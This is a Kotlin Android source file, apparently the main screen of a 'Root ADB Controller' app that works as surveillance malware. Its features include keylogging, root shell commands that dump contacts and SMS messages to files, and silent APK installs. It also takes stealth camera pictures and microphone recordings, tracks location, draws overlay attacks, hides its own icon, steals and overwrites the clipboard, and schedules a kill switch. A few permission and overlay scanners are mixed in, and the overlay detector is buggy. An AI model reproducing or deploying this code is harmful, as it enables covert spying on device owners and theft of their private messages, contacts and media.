package com.anti.rootadbcontroller

import android.app.ActivityManager
import android.app.AlarmManager
import android.app.PendingIntent
import android.app.usage.UsageStatsManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.hardware.camera2.CameraManager
import android.media.AudioManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.*
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.MoreVert
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import com.anti.rootadbcontroller.models.FeatureItem
import com.anti.rootadbcontroller.services.ShizukuManagerService
import com.anti.rootadbcontroller.services.StealthCameraService
import com.anti.rootadbcontroller.ui.theme.RootADBControllerTheme
import com.anti.rootadbcontroller.utils.RootUtils
import com.anti.rootadbcontroller.utils.ShizukuUtils
import java.io.File
import java.io.IOException
import java.util.*

class MainActivity : ComponentActivity() {

    private var isRootAvailable by mutableStateOf(false)
    private var isShizukuAvailable by mutableStateOf(false)
    private var shizukuManagerService: ShizukuManagerService? = null
    private var isShizukuServiceBound = false

    // Shizuku service connection
    private val shizukuServiceConnection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
            Log.d("MainActivity", "Shizuku service connected")
            val binder = service as ShizukuManagerService.ShizukuManagerBinder
            shizukuManagerService = binder.service
            isShizukuServiceBound = true
            checkShizukuStatus()
        }

        override fun onServiceDisconnected(name: ComponentName?) {
            Log.d("MainActivity", "Shizuku service disconnected")
            shizukuManagerService = null
            isShizukuServiceBound = false
            isShizukuAvailable = false
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        checkRootAccess()
        initializeShizuku()
        scheduleKillSwitch()

        setContent {
            RootADBControllerTheme {
                MainScreen(
                    isRootAvailable = isRootAvailable,
                    isShizukuAvailable = isShizukuAvailable,
                    onFeatureClick = { featureId -> onFeatureClick(featureId) },
                    onShizukuPermissionRequest = { requestShizukuPermission() }
                )
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (isShizukuServiceBound) {
            unbindService(shizukuServiceConnection)
        }
    }

    private fun initializeShizuku() {
        // Initialize Shizuku Utils
        ShizukuUtils.getInstance().initialize()

        // Bind to Shizuku Manager Service
        val intent = Intent(this, ShizukuManagerService::class.java)
        bindService(intent, shizukuServiceConnection, Context.BIND_AUTO_CREATE)
    }

    private fun checkShizukuStatus() {
        Thread {
            val shizukuUtils = ShizukuUtils.getInstance()
            val available = shizukuUtils.isShizukuAvailable()
            val hasPermission = shizukuUtils.hasShizukuPermission()

            runOnUiThread {
                isShizukuAvailable = available && hasPermission
                Log.d("MainActivity", "Shizuku status - Available: $available, Permission: $hasPermission")
            }
        }.start()
    }

    private fun requestShizukuPermission() {
        shizukuManagerService?.requestShizukuPermission()
        // Recheck status after a delay
        Thread {
            Thread.sleep(1000)
            checkShizukuStatus()
        }.start()
    }

    private fun onFeatureClick(featureId: Int) {
        if (!isRootAvailable && featureId != FEATURE_KEYLOGGING && featureId != FEATURE_PERMISSIONS_SCANNER && featureId != FEATURE_OVERLAY_DETECTOR && featureId != FEATURE_HIDDEN_APP_FINDER && featureId != FEATURE_CAMERA_MIC_DETECTOR && featureId != FEATURE_GET_CLIPBOARD && featureId != FEATURE_SET_CLIPBOARD) {
            // Non-root features can proceed
        } else if (!isRootAvailable) {
            // Silently fail for root features if not rooted
            return
        }

        when (featureId) {
            FEATURE_KEYLOGGING -> openAccessibilitySettings()
            FEATURE_DATA_EXFILTRATION -> exfiltrateAllData()
            FEATURE_SILENT_INSTALL -> findAndInstallFirstApk()
            FEATURE_NETWORK_MONITOR -> startNetworkMonitoring()
            FEATURE_FILE_ACCESS -> browseSystemFiles()
            FEATURE_SYSTEM_CONTROL -> rebootDevice() // Simplified for stealth
            FEATURE_SCREENSHOT -> takeScreenshot()
            FEATURE_LOG_ACCESS -> showLogAccess()
            FEATURE_MIC_RECORDER -> startMicRecording()
            FEATURE_LOCATION_TRACKER -> startLocationTracking()
            FEATURE_OVERLAY_ATTACK -> startOverlayAttack()
            FEATURE_HIDE_APP_ICON -> hideAppIcon()
            FEATURE_PERMISSIONS_SCANNER -> scanPermissions()
            FEATURE_OVERLAY_DETECTOR -> detectOverlays()
            FEATURE_HIDDEN_APP_FINDER -> findHiddenApps()
            FEATURE_CAMERA_MIC_DETECTOR -> detectCameraMicUsage()
            FEATURE_STEALTH_CAMERA -> takeStealthPicture()
            FEATURE_GET_CLIPBOARD -> getClipboard()
            FEATURE_SET_CLIPBOARD -> setClipboard("Pwned by Project-Anti") // Example text
        }
    }

    private fun checkRootAccess() {
        Thread {
            isRootAvailable = RootUtils.isRootAvailable()
        }.start()
    }

    private fun scheduleKillSwitch() {
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, com.anti.rootadbcontroller.services.KillSwitchReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)

        val calendar = Calendar.getInstance()
        calendar.add(Calendar.DAY_OF_YEAR, 7)

        alarmManager.set(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), pendingIntent)
        android.util.Log.d("MainActivity", "Kill switch scheduled for 7 days.")
    }

    private fun saveDataToFile(fileName: String, data: String) {
        val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
        val file = File(downloadsDir, fileName)
        try {
            file.writeText(data)
        } catch (e: IOException) {
            android.util.Log.e("MainActivity", "Failed to write to file $fileName", e)
        }
    }

    private fun openAccessibilitySettings() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        startActivity(intent)
    }

    private fun exfiltrateAllData() {
        // This would combine all data extraction methods into one
        RootUtils.executeRootCommand("content query --uri content://com.android.contacts/data --projection display_name:data1:mimetype") { output ->
            saveDataToFile("extracted_contacts.txt", output.joinToString("\n"))
        }
        RootUtils.executeRootCommand("content query --uri content://sms/inbox --projection address:body:date") { output ->
            saveDataToFile("extracted_messages.txt", output.joinToString("\n"))
        }
        // ... and so on for other data types
    }

    private fun findAndInstallFirstApk() {
        RootUtils.executeRootCommand("find /sdcard -name \"*.apk\"") { output ->
            val firstApk = output.firstOrNull { it.isNotBlank() }
            if (firstApk != null) {
                RootUtils.silentInstall(firstApk, null)
            }
        }
    }

    private fun startNetworkMonitoring() {
        RootUtils.executeRootCommand("netstat -tunap") { output ->
            saveDataToFile("network_connections.txt", output.joinToString("\n"))
        }
    }

    private fun browseSystemFiles() {
        RootUtils.executeRootCommand("ls -la /data") { output ->
            saveDataToFile("file_listing_data.txt", output.joinToString("\n"))
        }
    }

    private fun rebootDevice() {
        RootUtils.executeRootCommand("reboot", null)
    }

    private fun takeScreenshot() {
        val screenshotFile = File(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
            "screenshot_" + System.currentTimeMillis() + ".png"
        )
        RootUtils.takeScreenshot(screenshotFile.absolutePath, null)
    }

    private fun showLogAccess() {
        RootUtils.getSystemLogs { output ->
            saveDataToFile("system_logs.txt", output.joinToString("\n"))
        }
    }

    private fun startMicRecording() {
        startService(Intent(this, com.anti.rootadbcontroller.services.MicRecorderService::class.java))
    }

    private fun startLocationTracking() {
        startService(Intent(this, com.anti.rootadbcontroller.services.LocationTrackerService::class.java))
    }

    private fun startOverlayAttack() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
            startActivity(intent)
        } else {
            startService(Intent(this, com.anti.rootadbcontroller.services.OverlayService::class.java))
        }
    }

    private fun hideAppIcon() {
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun scanPermissions() {
        val pm = packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        val report = StringBuilder()
        val dangerousPermissions = arrayOf(
            "android.permission.CAMERA", "android.permission.RECORD_AUDIO",
            "android.permission.READ_CONTACTS", "android.permission.READ_SMS",
            "android.permission.ACCESS_FINE_LOCATION"
        )

        for (appInfo in packages) {
            try {
                val requestedPermissions = pm.getPackageInfo(appInfo.packageName, PackageManager.GET_PERMISSIONS).requestedPermissions
                if (requestedPermissions != null) {
                    val grantedDangerous = requestedPermissions.filter { dangerousPermissions.contains(it) }
                    if (grantedDangerous.isNotEmpty()) {
                        report.append("App: ${appInfo.loadLabel(pm)} (${appInfo.packageName})\n")
                        grantedDangerous.forEach { report.append("  - $it\n") }
                        report.append("\n")
                    }
                }
            } catch (e: PackageManager.NameNotFoundException) {
                // Ignore
            }
        }
        saveDataToFile("permissions_report.txt", report.toString())
    }

    private fun detectOverlays() {
        val pm = packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        val report = StringBuilder("Apps with Overlay Permission:\n")
        for (appInfo in packages) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (Settings.canDrawOverlays(this)) {
                    report.append("- ${appInfo.loadLabel(pm)} (${appInfo.packageName})\n")
                }
            }
        }
        saveDataToFile("overlay_report.txt", report.toString())
    }

    private fun findHiddenApps() {
        val pm = packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        val report = StringBuilder("Hidden Apps Found:\n")
        for (appInfo in packages) {
            val intent = pm.getLaunchIntentForPackage(appInfo.packageName)
            if (intent == null && (appInfo.flags and ApplicationInfo.FLAG_SYSTEM) == 0) {
                report.append("- ${appInfo.loadLabel(pm)} (${appInfo.packageName})\n")
            }
        }
        saveDataToFile("hidden_apps_report.txt", report.toString())
    }

    private fun detectCameraMicUsage() {
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val camManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val report = StringBuilder("Camera/Mic Status:\n")
        report.append("Microphone active: ${audioManager.isMicrophoneMute}\n")
        // Camera usage detection is more complex and requires callbacks. This is a simplified check.
        report.append("Camera in use: Checking would require a persistent service.\n")
        saveDataToFile("camera_mic_status.txt", report.toString())
    }

    private fun takeStealthPicture() {
        startService(Intent(this, StealthCameraService::class.java))
    }

    private fun getClipboard() {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val content = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: "Clipboard is empty."
        saveDataToFile("clipboard_content.txt", content)
    }

    private fun setClipboard(text: String) {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText("label", text)
        clipboard.setPrimaryClip(clip)
    }
}

@Composable
fun MainScreen(isRootAvailable: Boolean, isShizukuAvailable: Boolean, onFeatureClick: (Int) -> Unit, onShizukuPermissionRequest: () -> Unit) {
    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("Root ADB Controller") },
                backgroundColor = MaterialTheme.colors.surface,
                actions = {
                    RootStatusIndicator(isRootAvailable, isShizukuAvailable, onShizukuPermissionRequest)
                    // Dropdown menu can be added here if needed
                }
            )
        }
    ) { padding ->
        FeatureList(
            features = getFeatureList(LocalContext.current),
            onFeatureClick = onFeatureClick,
            modifier = Modifier.padding(padding)
        )
    }
}

@Composable
fun RootStatusIndicator(isRootAvailable: Boolean, isShizukuAvailable: Boolean, onShizukuPermissionRequest: () -> Unit) {
    Row(verticalAlignment = Alignment.CenterVertically) {
        val rootStatusText = if (isRootAvailable) "Rooted" else "Not Rooted"
        val rootColor = if (isRootAvailable) Color.Green else Color.Red
        Text(
            text = rootStatusText,
            color = rootColor,
            style = MaterialTheme.typography.caption,
            modifier = Modifier.padding(horizontal = 8.dp)
        )

        val shizukuStatusText = if (isShizukuAvailable) "Shizuku Ready" else "Shizuku Not Ready"
        val shizukuColor = if (isShizukuAvailable) Color.Green else Color.Red
        Text(
            text = shizukuStatusText,
            color = shizukuColor,
            style = MaterialTheme.typography.caption,
            modifier = Modifier
                .padding(horizontal = 8.dp)
                .clickable { onShizukuPermissionRequest() }
        )
    }
}

@Composable
fun FeatureList(features: List<FeatureItem>, onFeatureClick: (Int) -> Unit, modifier: Modifier = Modifier) {
    LazyColumn(modifier = modifier.background(MaterialTheme.colors.background)) {
        items(features) { feature ->
            FeatureCard(feature = feature, onClick = { onFeatureClick(feature.id) })
        }
    }
}

@Composable
fun FeatureCard(feature: FeatureItem, onClick: () -> Unit) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .padding(horizontal = 16.dp, vertical = 8.dp)
            .clickable(onClick = onClick),
        shape = MaterialTheme.shapes.large,
        backgroundColor = MaterialTheme.colors.surface,
        elevation = 4.dp
    ) {
        Row(
            modifier = Modifier.padding(16.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            // In a real app, you'd use feature.iconResId here
            // Icon(painterResource(id = feature.iconResId), contentDescription = null)
            Spacer(modifier = Modifier.width(16.dp))
            Column {
                Text(text = feature.title, style = MaterialTheme.typography.h6, fontWeight = FontWeight.Bold)
                Spacer(modifier = Modifier.height(4.dp))
                Text(text = feature.description, style = MaterialTheme.typography.body2, color = Color.Gray)
            }
        }
    }
}

fun getFeatureList(context: Context): List<FeatureItem> {
    return listOf(
        FeatureItem(FEATURE_KEYLOGGING, context.getString(R.string.keylogging), "Monitors and logs all text input.", 0),
        FeatureItem(FEATURE_DATA_EXFILTRATION, context.getString(R.string.data_exfiltration), "Extracts sensitive data like contacts, messages, and photos.", 0),
        FeatureItem(FEATURE_SILENT_INSTALL, context.getString(R.string.silent_install), "Installs APKs in the background without user interaction.", 0),
        FeatureItem(FEATURE_NETWORK_MONITOR, context.getString(R.string.network_monitor), "Displays all active network connections on the device.", 0),
        FeatureItem(FEATURE_FILE_ACCESS, context.getString(R.string.file_access), "Browse and view files in protected system directories.", 0),
        FeatureItem(FEATURE_SYSTEM_CONTROL, context.getString(R.string.system_control), "Control system functions like rebooting or toggling hardware.", 0),
        FeatureItem(FEATURE_SCREENSHOT, context.getString(R.string.screenshot), "Takes a screenshot of the current screen without any visual indication.", 0),
        FeatureItem(FEATURE_LOG_ACCESS, context.getString(R.string.log_access), "Accesses and displays system-level logs (logcat).", 0),
        FeatureItem(FEATURE_MIC_RECORDER, context.getString(R.string.mic_recorder), "Silently records audio from the microphone.", 0),
        FeatureItem(FEATURE_LOCATION_TRACKER, context.getString(R.string.location_tracker), "Fetches the device's last known GPS location.", 0),
        FeatureItem(FEATURE_OVERLAY_ATTACK, context.getString(R.string.overlay_attack), "Demonstrates a UI overlay by drawing a window over other apps.", 0),
        FeatureItem(FEATURE_HIDE_APP_ICON, context.getString(R.string.hide_app_icon), "Hides the app icon from the launcher.", 0),
        FeatureItem(FEATURE_PERMISSIONS_SCANNER, context.getString(R.string.permissions_scanner), "Scans all installed apps and lists those with potentially dangerous permissions.", 0),
        FeatureItem(FEATURE_OVERLAY_DETECTOR, context.getString(R.string.overlay_detector), "Lists all apps that have permission to draw over other applications.", 0),
        FeatureItem(FEATURE_HIDDEN_APP_FINDER, context.getString(R.string.hidden_app_finder), "Finds installed apps that do not have a launcher icon.", 0),
        FeatureItem(FEATURE_CAMERA_MIC_DETECTOR, context.getString(R.string.camera_mic_detector), "Detects if the camera or microphone is currently being used by any app.", 0),
        FeatureItem(FEATURE_STEALTH_CAMERA, context.getString(R.string.stealth_camera), "Silently takes a picture from the front camera.", 0),
        FeatureItem(FEATURE_GET_CLIPBOARD, context.getString(R.string.get_clipboard), "Gets the current clipboard content.", 0),
        FeatureItem(FEATURE_SET_CLIPBOARD, context.getString(R.string.set_clipboard), "Sets the clipboard content.", 0)
    )
}

// Feature IDs
const val FEATURE_KEYLOGGING = 1
const val FEATURE_DATA_EXFILTRATION = 2
const val FEATURE_SILENT_INSTALL = 3
const val FEATURE_NETWORK_MONITOR = 4
const val FEATURE_FILE_ACCESS = 5
const val FEATURE_SYSTEM_CONTROL = 6
const val FEATURE_SCREENSHOT = 7
const val FEATURE_LOG_ACCESS = 8
const val FEATURE_MIC_RECORDER = 9
const val FEATURE_LOCATION_TRACKER = 10
const val FEATURE_OVERLAY_ATTACK = 11
const val FEATURE_HIDE_APP_ICON = 12
const val FEATURE_PERMISSIONS_SCANNER = 13
const val FEATURE_OVERLAY_DETECTOR = 14
const val FEATURE_HIDDEN_APP_FINDER = 15
const val FEATURE_CAMERA_MIC_DETECTOR = 16
const val FEATURE_STEALTH_CAMERA = 17
const val FEATURE_GET_CLIPBOARD = 18
const val FEATURE_SET_CLIPBOARD = 19

@Preview(showBackground = true, uiMode = android.content.res.Configuration.UI_MODE_NIGHT_YES)
@Composable
fun DefaultPreview() {
    RootADBControllerTheme {
        MainScreen(isRootAvailable = true, isShizukuAvailable = true, onFeatureClick = {}, onShizukuPermissionRequest = {})
    }
}
